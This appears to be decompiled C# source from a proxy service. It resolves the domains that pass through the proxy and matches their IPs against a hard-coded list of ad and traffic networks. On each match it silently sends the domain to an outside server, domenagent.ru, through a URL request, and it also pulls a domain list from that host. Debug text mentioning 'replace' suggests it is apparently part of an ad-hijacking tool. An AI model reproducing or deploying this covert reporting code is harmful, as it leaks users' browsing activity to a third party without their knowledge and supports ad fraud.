using System;
using System.Collections;
using System.Net;
using System.Threading;

namespace ProxyService;

public class resolve
{
	public class ipsystem
	{
		public string ip;

		public string system;

		public ipsystem(string aip, string asystem)
		{
			ip = aip;
			system = asystem;
		}
	}

	private const int sleepy = 50;

	public static ArrayList iplook = new ArrayList();

	private static int addIndex = 0;

	private static int jobIndex = 0;

	public static ArrayList list = new ArrayList();

	public static Thread thJob;

	public static ArrayList domsCol = new ArrayList();

	public static Thread thDomainsLoader;

	public static void SafeAdd(string rnd)
	{
		try
		{
			bool flag = true;
			for (int i = 0; i <= list.Count - 1; i++)
			{
				string text = list[i]!.ToString();
				if (text == rnd)
				{
					flag = false;
					break;
				}
			}
			if (flag)
			{
				list.Add(rnd);
				addIndex++;
			}
		}
		catch (Exception ex)
		{
			ProxyServer.dbg("add_error: " + ex.Message);
		}
	}

	public static void JobStart()
	{
		ThreadStart start = JobGo;
		thJob = new Thread(start);
		thJob.Start();
	}

	public static void JobGo()
	{
		while (true)
		{
			try
			{
				while (jobIndex < addIndex)
				{
					try
					{
						string text = list[jobIndex]!.ToString();
						IPAddress[] array = new IPAddress[0];
						try
						{
							array = Dns.GetHostAddresses(text);
						}
						catch (Exception)
						{
						}
						IPAddress[] array2 = array;
						foreach (IPAddress iPAddress in array2)
						{
							foreach (ipsystem item in iplook)
							{
								if (item.ip.Trim().ToLower() == iPAddress.ToString().ToLower())
								{
									ProxyServer.dbg(text + "  -replace: " + iPAddress.ToString());
									vkbill.DownloadURL("http://www.domenagent.ru/service/adddomain.aspx?domain=" + text + "&comment=" + item.system);
								}
							}
						}
					}
					catch (Exception)
					{
					}
					jobIndex++;
					Thread.Sleep(50);
				}
			}
			catch (Exception)
			{
			}
			Thread.Sleep(50);
		}
	}

	public static void Start()
	{
		iplook.Add(new ipsystem("78.140.138.147", "popunder.ru"));
		iplook.Add(new ipsystem("88.85.93.35", "teasernet"));
		iplook.Add(new ipsystem("88.85.93.34", "teasernet"));
		iplook.Add(new ipsystem("184.168.221.66", "wizards"));
		iplook.Add(new ipsystem("184.168.174.55", "wizards"));
		iplook.Add(new ipsystem("46.165.197.231", "visitweb"));
		iplook.Add(new ipsystem("95.169.187.139", "mediarich"));
		iplook.Add(new ipsystem("62.152.53.252", "c.luxp.ru"));
		iplook.Add(new ipsystem("62.152.53.218", "c.luxp.ru"));
		iplook.Add(new ipsystem("89.108.74.61", "adprofy"));
		iplook.Add(new ipsystem("89.108.72.63", "adprofy"));
		iplook.Add(new ipsystem("195.234.99.231", "rarenok.biz"));
		iplook.Add(new ipsystem("91.220.101.115", "promoloader.com"));
		iplook.Add(new ipsystem("62.212.72.238", "rulerclick.ru"));
		iplook.Add(new ipsystem("91.105.232.55", "traffka.ru"));
		iplook.Add(new ipsystem("78.140.166.114", "adsyst.ru"));
		iplook.Add(new ipsystem("78.140.166.115", "adsyst.ru"));
		iplook.Add(new ipsystem("93.184.220.196", "huyznaet.ru"));
		JobStart();
	}

	private static void loadDomainsFromServer()
	{
		ThreadStart start = loadDoms;
		thDomainsLoader = new Thread(start);
		thDomainsLoader.Start();
	}

	private static void loadDoms()
	{
		string text = "";
		while (true)
		{
			if (!text.Contains("googlesyndication"))
			{
				text = vkbill.DownloadURL("http://domenagent.ru/service/list.aspx");
				if (text.Contains("googlesyndication"))
				{
					break;
				}
				Thread.Sleep(600000);
				continue;
			}
			return;
		}
		string[] array = text.Split("<BR>".ToCharArray());
		if (array.Length >= 1)
		{
			string[] array2 = array;
			foreach (string text2 in array2)
			{
				string text3 = text2.Trim().ToLower();
				text3.Contains(".");
			}
		}
		domsCol.Add("my.com");
		domsCol.Sort();
	}
}
